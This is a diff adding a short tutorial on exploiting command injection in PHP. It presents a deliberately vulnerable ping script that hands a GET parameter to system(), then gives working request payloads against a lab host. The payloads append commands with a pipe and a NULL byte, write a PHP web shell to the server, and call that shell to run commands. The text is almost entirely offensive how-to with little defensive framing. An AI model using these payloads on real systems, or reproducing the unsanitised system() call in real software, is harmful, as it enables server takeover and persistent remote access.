@@ -1,0 +1,40 @@
+Introduction:
+--------------
+Exploiting Command Execution Vulnerabilities in PHP is just like exploiting any other form of injection in any programming language. You must be able to inject code which does not raise any condition on any validation and is not altered/sanitised before it gets to it's destination. At it's destination, in this case a PHP Function that can be used for executing operating system commands (such as system() ) the user input must be formatted so that is executes in context with the other supplied data to the function. This is not a common vulnerability discovered in PHP applications, at least not any more. Programmers would obviously be careful when allowing user input to be part of data sent to a function that could be used for executing operating system commands. Although of course there are people out there of course that are not caring about or handling validation.
+	++++++++++++++++++++++++++++++++++++++++++++++++++
+example: 
+querydomain.php
+<?php
+if(isset($_GET['domain']))
+{
+	$query = "ping " . $_GET['domain'] . " -n 4";
+	echo $query;
+	echo system($query);
+}
+?>
+	++++++++++++++++++++++++++++++++++++++++++++++++++
+2--> What You Need To Know:
+---------------------------
+When exploiting a Command Execution vulnerability it is most likely that your user input concatenated with other strings and then sent to the desired function, so the operating system command can be executed.
+
+Sites that do queries such as a Ping and/or Whois may form a string from user data and hard coded string(s) to ping or query a host for example.
+
+When this is the case it is most likely what you will be doing to exploit the vulnerability is either altering the existing command (parameters) or appending another command to be executed.
+
+When can use the | or & character to append other commands onto the one being executed. 
+
+We can use back ticks ` ` in order to encapsulate commands to be evaluated and then output Being that another string “ -n 4 ” is being appending onto our string after our string is appended to “ ping “ , we have to terminate the string with a NULL character.
+
+URL (GET Request):
+http://10.0.0.4/CommandExecution/querydomain.php?domain=yahoo.com|driverquery%00
+	++++++++++++++++++++++++++++++++++++++++++++++++++
+3--> Remote Command Execution → File Write → Shell Execute:
+-----------------------------------------------------------
+URL (GET Request):
+------------------
+http://10.0.0.4/CommandExecution/querydomain.php?domain=yahoo.com|echo%20%22%3C?php%20echo%20system($_GET['cmd']);%20?%3E%22%20%3E%20h4xex3c.php%00
+
+URL (GET Request):
+------------------
+http://10.0.0.4/CommandExecution/h4xex3c.php?cmd=dir
+	++++++++++++++++++++++++++++++++++++++++++++++++++
